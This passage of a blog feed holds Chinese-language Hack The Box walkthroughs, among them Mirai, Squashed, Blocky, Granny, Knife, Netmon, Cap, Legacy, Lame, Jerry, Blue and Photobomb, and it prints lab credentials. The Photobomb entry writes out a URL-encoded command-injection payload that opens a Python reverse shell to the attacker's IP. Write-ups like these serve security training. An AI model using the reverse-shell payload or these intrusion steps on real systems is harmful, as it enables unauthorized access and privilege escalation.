src="/2023/04/27/file-upload/mage-20230506154003209.png" alt="image-20230506154003209"></p><p>得到数据库的账号密码。</p><p>mysql登录，注意需要使用-e参数执行命令，由于不是完全交互式shell，直接登录会卡死：</p><p><img src="/2023/04/27/file-upload/mage-20230506154106713.png" alt="image-20230506154106713"></p><p>筛选出pass，加密的密文，接下来考虑解密。</p><p>使用john，失败：</p><p><img src="/2023/04/27/file-upload/mage-20230506154158571.png" alt="image-20230506154158571"></p><p>使用hashcat爆破，首先选择mode：</p><p><img src="/2023/04/27/file-upload/mage-20230506154301967.png" alt="image-20230506154301967"></p><p>爆破：<br><code>hashcat -m 7900 pass /usr/share/wordlists/rockyou.txt</code></p><p><img src="/2023/04/27/file-upload/mage-20230506154328257.png" alt="image-20230506154328257"></p><p>得到密码booboo，22端口开放，直接ssh登录：</p><p><img src="/2023/04/27/file-upload/mage-20230506154359188.png" alt="image-20230506154359188"></p><p>sudo -l，发现可以sudo直接snap命令。去gtfobins搜索该命令：</p><p><img src="/2023/04/27/file-upload/mage-20230506154436272.png" alt="image-20230506154436272"></p><p>先在本地kali生成一个.snap文件，再上传到靶机上执行。</p><p>如果kali没有fpm，先安装<code>gem install fpm</code>，接着生成.snap文件，command就是要执行的命令：</p><p><img src="/2023/04/27/file-upload/mage-20230506154512221.png" alt="image-20230506154512221"></p><p>在靶机上下载该文件，wget失败，因此使用curl保存，再执行提权命令：</p><p><img src="/2023/04/27/file-upload/mage-20230506154621073.png" alt="image-20230506154621073"></p><p>uid&#x3D;0，root权限。</p><p>修改command为cat &#x2F;root&#x2F;root.txt:</p><p><img src="/2023/04/27/file-upload/mage-20230506154648840.png" alt="image-20230506154648840"></p><p>执行：</p><p><img src="/2023/04/27/file-upload/mage-20230506154713102.png" alt="image-20230506154713102"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_mirai</title>
    <link href="/2023/05/06/htb-mirai/"/>
    <url>/2023/05/06/htb-mirai/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-mirai"><a href="#htb-mirai" class="headerlink" title="htb_mirai"></a>htb_mirai</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>nmap扫描：</p><p><img src="/2023/04/27/file-upload/age-20230505211229060.png" alt="image-20230505211229060"></p><p>重点关注80端口和32400的http服务。</p><p>80端口：</p><p><img src="/2023/04/27/file-upload/age-20230506100232470.png" alt="image-20230506100232470"></p><p>空白，查看源代码也没有任何内容。</p><p>目录爆破：</p><p><img src="/2023/04/27/file-upload/age-20230506100934237.png" alt="image-20230506100934237"></p><p>存在admin目录：</p><p><img src="/2023/04/27/file-upload/age-20230506100959978.png" alt="image-20230506100959978"></p><p>在底部可以看到版本信息：</p><p><img src="/2023/04/27/file-upload/age-20230506101533458.png" alt="image-20230506101533458"></p><p>3.1.4，exploitdb搜索一下：</p><p><img src="/2023/04/27/file-upload/age-20230506101602622.png" alt="image-20230506101602622"></p><p>存在rce，但是版本号不对，并且需要认证，pass。</p><p>点击图标：</p><p><img src="/2023/04/27/file-upload/age-20230506101903505.png" alt="image-20230506101903505"></p><p>发现是树莓派，google得到默认账号密码：pi&#x2F;raspberry，尝试登录，失败。</p><p>ssh登录成功：</p><p><img src="/2023/04/27/file-upload/age-20230506102203946.png" alt="image-20230506102203946"></p><p>对于另一个开放的http端口，访问后为一个登录框：</p><p><img src="/2023/04/27/file-upload/age-20230506102444787.png" alt="image-20230506102444787"></p><p>无法注册，登录后各个参数尝试注入，无果，并且会锁登录次数，pass。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>ssh成功后，find查找flag：</p><p><img src="/2023/04/27/file-upload/age-20230506102538831.png" alt="image-20230506102538831"></p><p>sudo -l提权：</p><p><img src="/2023/04/27/file-upload/age-20230506102728212.png" alt="image-20230506102728212"></p><p>查看root.txt，提示：</p><p><img src="/2023/04/27/file-upload/age-20230506102927697.png" alt="image-20230506102927697"></p><p>root在usb里，mount命令结合df命令查看：</p><p><img src="/2023/04/27/file-upload/age-20230506103005719.png" alt="image-20230506103005719"></p><p>进入&#x2F;media&#x2F;usbstick查看：</p><p><img src="/2023/04/27/file-upload/age-20230506103138523.png" alt="image-20230506103138523"></p><p>提示root被删了….，翻&#x2F;dev&#x2F;sdb文件：</p><p><img src="/2023/04/27/file-upload/age-20230506103217232.png" alt="image-20230506103217232"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_squashed</title>
    <link href="/2023/05/05/htb-squashed/"/>
    <url>/2023/05/05/htb-squashed/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-squashed"><a href="#htb-squashed" class="headerlink" title="htb_squashed"></a>htb_squashed</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap：</p><p><img src="/2023/04/27/file-upload/image-20230505170109970.png" alt="image-20230505170109970"></p><p>详细扫描：</p><p><img src="/2023/04/27/file-upload/image-20230505170223256.png" alt="image-20230505170223256"></p><p>重点放在http和rpc服务上。</p><p>先看80端口的http：</p><p><img src="/2023/04/27/file-upload/image-20230505170501511.png" alt="image-20230505170501511"></p><p>目录爆破：<br><img src="/2023/04/27/file-upload/image-20230505170521065.png" alt="image-20230505170521065"></p><p>没有可用信息。</p><p>rpcinfo：</p><p><img src="/2023/04/27/file-upload/image-20230505170841327.png" alt="image-20230505170841327"></p><p>showmount看一下有无可挂载目录：</p><p><img src="/2023/04/27/file-upload/image-20230505170910819.png" alt="image-20230505170910819"></p><p>有两个，&#x2F;home&#x2F;ross和&#x2F;var&#x2F;www&#x2F;html。</p><p>分别挂载到&#x2F;mnt&#x2F;1,&#x2F;mnt&#x2F;2:</p><p><img src="/2023/04/27/file-upload/image-20230505172757455.png" alt="image-20230505172757455"></p><p>并且根据所有者的uid，创建用户test1,test2，uid分别为1001和2017.</p><p>切换到test1，进入&#x2F;home&#x2F;ross挂载目录：</p><p><img src="/2023/04/27/file-upload/image-20230505172957737.png" alt="image-20230505172957737"></p><p>发现.Xauthority文件，查看内容发现magic-cookie等字符串：</p><p><img src="/2023/04/27/file-upload/image-20230505173026499.png" alt="image-20230505173026499"></p><p>接着切换到test2，进入&#x2F;var&#x2F;www&#x2F;html:</p><p><img src="/2023/04/27/file-upload/image-20230505173119147.png" alt="image-20230505173119147"></p><p>看起来是网站目录，尝试写入文件：</p><p><img src="/2023/04/27/file-upload/image-20230505173153436.png" alt="image-20230505173153436"></p><p>写入成功，通过curl判断后台语言类型：</p><p><img src="/2023/04/27/file-upload/image-20230505173221379.png" alt="image-20230505173221379"></p><p>暂未发现，尝试php：</p><p><img src="/2023/04/27/file-upload/image-20230505173325297.png" alt="image-20230505173325297"></p><p>成功解析，下一步直接写马弹shell。</p><p>在本机上查找php反弹shell脚本，修改lhost后本地开启python http server，再用test2用户下载到网站目录下：</p><p><img src="/2023/04/27/file-upload/image-20230505173539068.png" alt="image-20230505173539068"></p><p>访问php马，成功接收到shell：</p><p><img src="/2023/04/27/file-upload/image-20230505173728022.png" alt="image-20230505173728022"></p><p>在home目录下发现user.txt：</p><p><img src="/2023/04/27/file-upload/image-20230505173824712.png" alt="image-20230505173824712"></p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>接下来进行权限提升。（全靠wp）</p><p>将&#x2F;home&#x2F;ross目录下的.Xauthority保存到&#x2F;tmp目录下：</p><p><img src="/2023/04/27/file-upload/image-20230505174239342.png" alt="image-20230505174239342"></p><p>保存之后设置环境变量XAUTHORITY，并且通过w命令查看当前所处的display：</p><p><img src="/2023/04/27/file-upload/image-20230505174421274.png" alt="image-20230505174421274"></p><p>起python服务器，下载至本地，再利用convert工具转换为png：</p><p><img src="/2023/04/27/file-upload/image-20230505174724974.png" alt="image-20230505174724974"></p><p>发现root密码，su提到root：</p><p><img src="/2023/04/27/file-upload/image-20230505174833420.png" alt="image-20230505174833420"></p><p>成功。</p><p>涉及到的X11工具为一个display manager，具体相关原理自行google。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_blocky</title>
    <link href="/2023/05/05/htb-blocky/"/>
    <url>/2023/05/05/htb-blocky/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-blocky"><a href="#htb-blocky" class="headerlink" title="htb_blocky"></a>htb_blocky</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap：</p><p><img src="/2023/04/27/file-upload/-20230505100458297.png" alt="image-20230505100458297"></p><p><img src="/2023/04/27/file-upload/-20230505100513185.png" alt="image-20230505100513185"></p><p>访问http（记得添加dns解析）：</p><p><img src="/2023/04/27/file-upload/-20230505100551956.png" alt="image-20230505100551956"></p><p>目录爆破：</p><p><img src="/2023/04/27/file-upload/-20230505100715971.png" alt="image-20230505100715971"></p><p>这里有几个目录需要关注，首先是wp-login.php，表明这是wordpress，其次还存在phpmyadmin，可以考虑写shell，还有&#x2F;plugins。</p><p>phpmyadmin:</p><p><img src="/2023/04/27/file-upload/-20230505100857737.png" alt="image-20230505100857737"></p><p>弱口令失败，常规的登录界面：</p><p><img src="/2023/04/27/file-upload/-20230505101115855.png" alt="image-20230505101115855"></p><p>&#x2F;plugins：</p><p><img src="/2023/04/27/file-upload/-20230505101142490.png" alt="image-20230505101142490"></p><p>存在两个jar包，下载至本地，利用jd-gui查看：</p><p><img src="/2023/04/27/file-upload/-20230505101337316.png" alt="image-20230505101337316"></p><p>在blockycore.class中发现一组账号密码:root&#x2F;8YsqfCTnvxAUeduzjNSXe22</p><p>由于网站为wordpress，用wpscan扫一下：</p><p><code>wpscan --url http://blocky.htb -e u,ap</code></p><p><img src="/2023/04/27/file-upload/-20230505101556152.png" alt="image-20230505101556152"></p><p>发现用户notch。</p><p>接下来尝试利用账号密码登录wordpress，失败。</p><p>用该账户登录phpmyadmin：</p><p><img src="/2023/04/27/file-upload/-20230505101918535.png" alt="image-20230505101918535"></p><p>成功登录，并且查到notch用户。</p><p>不知道绝对路径和网站目录路径，因此跳过phpmyadmin写shell，再利用该账户ssh：</p><p><img src="/2023/04/27/file-upload/-20230505102933041.png" alt="image-20230505102933041"></p><p>root登录失败，notch登录成功。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>sudo -l：</p><p><img src="/2023/04/27/file-upload/-20230505103014481.png" alt="image-20230505103014481"></p><p>可以执行所有命令，直接&#x2F;bin&#x2F;bash:</p><p><img src="/2023/04/27/file-upload/-20230505103044495.png" alt="image-20230505103044495"></p><p>root权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_granny</title>
    <link href="/2023/05/04/htb-granny/"/>
    <url>/2023/05/04/htb-granny/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-granny"><a href="#htb-granny" class="headerlink" title="htb_granny"></a>htb_granny</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap扫一下端口：</p><p><img src="/2023/04/27/file-upload/mage-20230504104404836-168316916606612.png" alt="image-20230504104404836"></p><p>发现为IIS 6.0，windows系统：</p><p><img src="/2023/04/27/file-upload/mage-20230504104434854-168316916606713.png" alt="image-20230504104434854"></p><p>并且存在http-webdav。</p><p>上面可以看到支持PUT,MOVE等http方法，很自然想到put一个shell.txt，再通过MOVE来执行。</p><p>curl查看信息：</p><p><img src="/2023/04/27/file-upload/mage-20230504104556287-168316916606714.png" alt="image-20230504104556287"></p><p>asp.net。</p><p>此处可以通过burp，发生PUT请求，上传一个txt文件，再move，也可以直接用工具davtest：</p><p><img src="/2023/04/27/file-upload/mage-20230504104710372-168316916606715.png" alt="image-20230504104710372"></p><p>测试发现可以上传文件。</p><p>msfvenom生成asp马，davtest上传：</p><p><img src="/2023/04/27/file-upload/mage-20230504104759856-168316916606716.png" alt="image-20230504104759856"></p><p><img src="/2023/04/27/file-upload/mage-20230504104809685-168316916606717.png" alt="image-20230504104809685"></p><p>接下来move该文件，davtest工具自带了move参数，但是未能成功利用，改用curl：</p><p><img src="/2023/04/27/file-upload/mage-20230504104913150-168316916606718.png" alt="image-20230504104913150"></p><p>msf开启监听，成功回连：</p><p><img src="/2023/04/27/file-upload/mage-20230504104950240-168316916606719.png" alt="image-20230504104950240"></p><p>这里执行getuid或者sysinfo都提示access denied，直接进程迁移即可：</p><p><img src="/2023/04/27/file-upload/mage-20230504105627463-168316916606720.png" alt="image-20230504105627463"></p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>x86系统，接下来用msf自动查找提权模块：</p><p><img src="/2023/04/27/file-upload/mage-20230504105705635-168316916606721.png" alt="image-20230504105705635"></p><p>选择第一个，exploit，拿到system权限：</p><p><img src="/2023/04/27/file-upload/mage-20230504105745329-168316916606311.png" alt="image-20230504105745329"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_knife</title>
    <link href="/2023/05/03/htb-knife/"/>
    <url>/2023/05/03/htb-knife/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-knife"><a href="#htb-knife" class="headerlink" title="htb_knife"></a>htb_knife</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap扫描：</p><p><img src="/2023/04/27/file-upload/age-20230503211205639.png" alt="image-20230503211205639"></p><p>22，80端口开放，进行扫描结果如上。</p><p>火狐访问：</p><p><img src="/2023/04/27/file-upload/age-20230503211315489.png" alt="image-20230503211315489"></p><p>看起来是个静态页面，尝试目录爆破：</p><p><img src="/2023/04/27/file-upload/age-20230503211338356.png" alt="image-20230503211338356"></p><p>没有可用信息。</p><p>尝试curl</p><p><img src="/2023/04/27/file-upload/age-20230503212322026.png" alt="image-20230503212322026"></p><p>发现php&#x2F;8.1.0-dev，searchsploit搜索：<br><img src="/2023/04/27/file-upload/age-20230503212552202.png" alt="image-20230503212552202"></p><p>直接利用py脚本：</p><p><img src="/2023/04/27/file-upload/age-20230503212837304.png" alt="image-20230503212837304"></p><p>getshell。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>使用上述脚本连接的shell不稳定，直接在ua里弹shell，nc监听：</p><p><img src="/2023/04/27/file-upload/age-20230503212939601.png" alt="image-20230503212939601"></p><p><img src="/2023/04/27/file-upload/age-20230503213001126.png" alt="image-20230503213001126"></p><p>sudo -l：</p><p><img src="/2023/04/27/file-upload/age-20230503213116184.png" alt="image-20230503213116184"></p><p>可以sudo执行knife文件。</p><p>使用file和strings命令查看knife：</p><p><img src="/2023/04/27/file-upload/age-20230503213202030.png" alt="image-20230503213202030"></p><p>大概看出为一个rb的可执行文件。</p><p>&#x2F;usr&#x2F;bin&#x2F;knife -h:</p><p><img src="/2023/04/27/file-upload/age-20230503213358978.png" alt="image-20230503213358978"></p><p>knife exec [script]</p><p>因此写一个rb文件，给bash加suid，再通过&#x2F;bin&#x2F;bash -p提权：</p><p><img src="/2023/04/27/file-upload/age-20230503213445945.png" alt="image-20230503213445945"></p><p>成功拿到root权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_netmon</title>
    <link href="/2023/05/03/htb-netmon/"/>
    <url>/2023/05/03/htb-netmon/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-netmon"><a href="#htb-netmon" class="headerlink" title="htb_netmon"></a>htb_netmon</h1><p>首先是nmap扫描：</p><p><code>nmap -p- --min-rate=1000 -T4 10.10.10.152</code></p><p><img src="/2023/04/27/file-upload/mage-20230503200138890.png" alt="image-20230503200138890"></p><p>ftp服务开放，ftp尝试匿名登录：</p><p><img src="/2023/04/27/file-upload/mage-20230503200318244.png" alt="image-20230503200318244"></p><p>在public目录下发现user.txt.</p><p>接下来考虑http服务。</p><p>仔细扫一下80口：</p><p><img src="/2023/04/27/file-upload/mage-20230503200414831.png" alt="image-20230503200414831"></p><p>发现为PRTG 18.1，火狐访问：<br><img src="/2023/04/27/file-upload/mage-20230503200507925.png" alt="image-20230503200507925"></p><p>需要账号密码进行登录，尝试prtg默认密码prtgadmin&#x2F;prtgadmin失败，再次回到ftp寻找：</p><p><img src="/2023/04/27/file-upload/mage-20230503200600225.png" alt="image-20230503200600225"></p><p>最终在&#x2F;users&#x2F;all user&#x2F;paessler&#x2F;prtg network monitor目录下找到配置文件（看wp得知）。</p><p>接下来搜索密码相关字符：</p><p><img src="/2023/04/27/file-upload/mage-20230503200714445.png" alt="image-20230503200714445"></p><p>找到prtgadmin&#x2F;PrTg@dmin2018</p><p>利用这组账号登录，失败，正确密码为PrTg@dmin2019(参考wp得知)。</p><p>searchsploit搜索相关漏洞：</p><p><img src="/2023/04/27/file-upload/mage-20230503200847852.png" alt="image-20230503200847852"></p><p>存在RCE，查看sh文件：</p><p><img src="/2023/04/27/file-upload/mage-20230503200916968.png" alt="image-20230503200916968"></p><p>CVE-2018-9276.</p><p>github下载相关利用poc：</p><p><img src="/2023/04/27/file-upload/mage-20230503200959209.png" alt="image-20230503200959209"></p><p>直接为system权限：</p><p><img src="/2023/04/27/file-upload/mage-20230503201012353.png" alt="image-20230503201012353"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_cap</title>
    <link href="/2023/05/02/htb-cap/"/>
    <url>/2023/05/02/htb-cap/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-cap"><a href="#htb-cap" class="headerlink" title="htb_cap"></a>htb_cap</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>端口扫描：</p><p><code>nmap -p- --min-rate=1000 -T4 10.10.10.245</code></p><p><img src="/2023/04/27/file-upload/e-20230502220157451.png" alt="image-20230502220157451"></p><p><code>nmap -sC -sV -A -p 21,22,80 10.10.10.245</code></p><p><img src="/2023/04/27/file-upload/e-20230502221443622.png" alt="image-20230502221443622"></p><p>开放了21，22，80端口，首先尝试从80http服务突破，访问：</p><p><img src="/2023/04/27/file-upload/e-20230502223709813.png" alt="image-20230502223709813"></p><p>点击security snapshots：</p><p><img src="/2023/04/27/file-upload/e-20230502224340252.png" alt="image-20230502224340252"></p><p>发现url变为&#x2F;data&#x2F;1.</p><p>此时将url改为&#x2F;data&#x2F;0,页面改变，出现流量，点击下载，查看下载的pcap：</p><p><img src="/2023/04/27/file-upload/e-20230502224432032.png" alt="image-20230502224432032"></p><p>发现tfp流量，查看内容：</p><p><img src="/2023/04/27/file-upload/e-20230502224603202.png" alt="image-20230502224603202"></p><p>找到ftp账号密码。</p><p>接下来使用ftp登录：</p><p><img src="/2023/04/27/file-upload/e-20230502224824145.png" alt="image-20230502224824145"></p><p>找到user.txt。</p><p>再用这组账号尝试直接登录ssh：</p><p><img src="/2023/04/27/file-upload/e-20230502224913833.png" alt="image-20230502224913833"></p><p>成功，接下来提权到root。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>从本地使用wget下载linpeas到靶机上，加执行权限运行：</p><p><img src="/2023/04/27/file-upload/e-20230502225620044.png" alt="image-20230502225620044"></p><p>这里标注出，python3.8，有cap_setuid权限。</p><p>gtfobins网站搜索：</p><p><img src="/2023/04/27/file-upload/e-20230502225710519.png" alt="image-20230502225710519"></p><p>尝试执行：</p><p><img src="/2023/04/27/file-upload/e-20230502225740390.png" alt="image-20230502225740390"></p><p>成功提权到root权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_legacy</title>
    <link href="/2023/05/01/htb-legacy/"/>
    <url>/2023/05/01/htb-legacy/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-legacy"><a href="#htb-legacy" class="headerlink" title="htb_legacy"></a>htb_legacy</h1><p>nmap端口扫描：</p><p><img src="/2023/04/27/file-upload/mage-20230501142850551.png" alt="image-20230501142850551"></p><p>扫服务：</p><p><img src="/2023/04/27/file-upload/mage-20230501142914119.png" alt="image-20230501142914119"></p><p>开放135，139，445端口，考虑ms17010，先用nmap进行漏洞扫描：</p><p><code>nmap -sC -sV -A -p 135,139,445 --script vuln 10.10.10.4</code></p><p><img src="/2023/04/27/file-upload/mage-20230501143008849.png" alt="image-20230501143008849"></p><p>ms08-067 vulnerable。</p><p>msf：</p><p><img src="/2023/04/27/file-upload/mage-20230501143055349.png" alt="image-20230501143055349"></p><p>getshell，system权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_lame</title>
    <link href="/2023/05/01/htb-lame/"/>
    <url>/2023/05/01/htb-lame/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-lame"><a href="#htb-lame" class="headerlink" title="htb_lame"></a>htb_lame</h1><p>nmap扫描：</p><p><img src="/2023/04/27/file-upload/ge-20230501211833742.png" alt="image-20230501211833742"></p><p>服务探测：</p><p><img src="/2023/04/27/file-upload/ge-20230501211850783.png" alt="image-20230501211850783"></p><p>漏洞扫描：</p><p><img src="/2023/04/27/file-upload/ge-20230501211911579.png" alt="image-20230501211911579"></p><p>没有直接发现可利用漏洞。</p><p>使用searchsploit搜索相关漏洞：</p><p><img src="/2023/04/27/file-upload/ge-20230501212032502.png" alt="image-20230501212032502"></p><p>首先是vsftpd，找到一个后门，尝试后无果，跳过。</p><p>接下来是samba：</p><p><img src="/2023/04/27/file-upload/ge-20230501212113153.png" alt="image-20230501212113153"></p><p>发现命令注入漏洞，但是在msf模块中，尽量避免使用msf：</p><p><img src="/2023/04/27/file-upload/ge-20230501212313179.png" alt="image-20230501212313179"></p><p>直接查看rb脚本，发现CVE-2007-2447。</p><p>github搜索并git clone exp：</p><p><img src="/2023/04/27/file-upload/ge-20230501212415484.png" alt="image-20230501212415484"></p><p><img src="/2023/04/27/file-upload/ge-20230501212444089.png" alt="image-20230501212444089"></p><p>本地起监听，攻击成功，root权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_jerry</title>
    <link href="/2023/05/01/htb-jerry/"/>
    <url>/2023/05/01/htb-jerry/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-jerry"><a href="#htb-jerry" class="headerlink" title="htb_jerry"></a>htb_jerry</h1><p>nmap先端口扫描：</p><p><img src="/2023/04/27/file-upload/age-20230501213312119.png" alt="image-20230501213312119"></p><p>8080的http服务，firefox访问看看：</p><p><img src="/2023/04/27/file-upload/age-20230501213335521.png" alt="image-20230501213335521"></p><p>tomcat。使用tomcat字典进行目录爆破，先查找tomcat字典：</p><p><img src="/2023/04/27/file-upload/age-20230501213409061.png" alt="image-20230501213409061"></p><p>爆破：</p><p><img src="/2023/04/27/file-upload/age-20230501213425390.png" alt="image-20230501213425390"></p><p>访问之后，发现只有manager可利用，为登录页面：</p><p><img src="/2023/04/27/file-upload/age-20230501213449833.png" alt="image-20230501213449833"></p><p>tomcat&#x2F;tomcat登录失败。此时点击cancel：</p><p><img src="/2023/04/27/file-upload/age-20230501213512808.png" alt="image-20230501213512808"></p><p>返回401页面，并包含了tomcat&#x2F;s3cret的一组账号密码：</p><p><img src="/2023/04/27/file-upload/age-20230501213556528.png" alt="image-20230501213556528"></p><p>成功登录。</p><p>接下来就是上传war来getshell：</p><p><img src="/2023/04/27/file-upload/age-20230501214307244.png" alt="image-20230501214307244"></p><p>msfvenom生成war格式的马，上传：</p><p><img src="/2023/04/27/file-upload/age-20230501214326514.png" alt="image-20230501214326514"></p><p>上传成功，msf中开监听，点击&#x2F;shell即可上线：</p><p><img src="/2023/04/27/file-upload/age-20230501214524229.png" alt="image-20230501214524229"></p><p>查看whoami，system权限：</p><p><img src="/2023/04/27/file-upload/age-20230501214538005.png" alt="image-20230501214538005"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_blue</title>
    <link href="/2023/05/01/htb-blue/"/>
    <url>/2023/05/01/htb-blue/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-blue"><a href="#htb-blue" class="headerlink" title="htb_blue"></a>htb_blue</h1><p>nmap端口扫描：</p><p><img src="/2023/04/27/file-upload/ge-20230501102723572.png" alt="image-20230501102723572"></p><p>扫具体服务：</p><p><img src="/2023/04/27/file-upload/ge-20230501102743582.png" alt="image-20230501102743582"></p><p>win7&#x2F;win2008，开放了139，445端口，ms17-010：</p><p><img src="/2023/04/27/file-upload/ge-20230501102958871.png" alt="image-20230501102958871"></p><p>getshell，system权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_photobomb</title>
    <link href="/2023/04/28/htb-photobomb/"/>
    <url>/2023/04/28/htb-photobomb/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-photobomb"><a href="#htb-photobomb" class="headerlink" title="htb_photobomb"></a>htb_photobomb</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先使用nmap简单扫一下端口：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125553727.png" alt="image-20230428125553727"></p><p>加上参数扫服务：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125623120.png" alt="image-20230428125623120"></p><p>火狐访问http服务，dns解析出错：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125831914.png" alt="image-20230428125831914"></p><p>域名加到hosts文件：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125940041.png" alt="image-20230428125940041"></p><p>成功：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125955771.png" alt="image-20230428125955771"></p><p>to get started, please click here,点击超链：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130205321.png" alt="image-20230428130205321"></p><p>弹出一个登录框，无法抓取流量，应该是前端校验。</p><p>尝试目录爆破：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130417051.png" alt="image-20230428130417051"></p><p>也没有可利用内容。</p><p>查看源代码：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130456002.png" alt="image-20230428130456002"></p><p>出现可疑js文件，photobomb.js:</p><p><img src="/2023/04/27/file-upload/b/image-20230428130526194.png" alt="image-20230428130526194"></p><p><code>http://pH0t0:b0Mb!@photobomb.htb/printer</code>尝试用此处的pH0t0:b0Mb!作为用户密码进行登录：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130702335.png" alt="image-20230428130702335"></p><p>登录成功。</p><p>页面有下载图片功能，用burp查看具体流量：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130947611.png" alt="image-20230428130947611"></p><p>对photo，filetype等参数测试sql漏洞无果，尝试命令拼接rce。</p><p>首先本地开启http-server：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131139256.png" alt="image-20230428131139256"></p><p><img src="/2023/04/27/file-upload/b/image-20230428131041281.png" alt="image-20230428131041281"></p><p>修改photo参数，输入命令<code>;curl 10.10.16.2</code>，使用ctrl+u，对命令进行编码，空格自动替换为+，发送请求后无响应。</p><p>接下来尝试filetype参数：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131530670.png" alt="image-20230428131530670"></p><p>本地成功接受到curl请求，可以判断存在命令注入：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131517217.png" alt="image-20230428131517217"></p><p>接下来直接反弹shell：</p><p><code>;export+RHOST=&quot;10.10.16.2&quot;;export+RPORT=4444;python3+-c+&#39;import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>同样需要ctrl+u编码：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131733399.png" alt="image-20230428131733399"></p><p>成功接收到shell。</p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>在home下发现user.txt：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132024695.png" 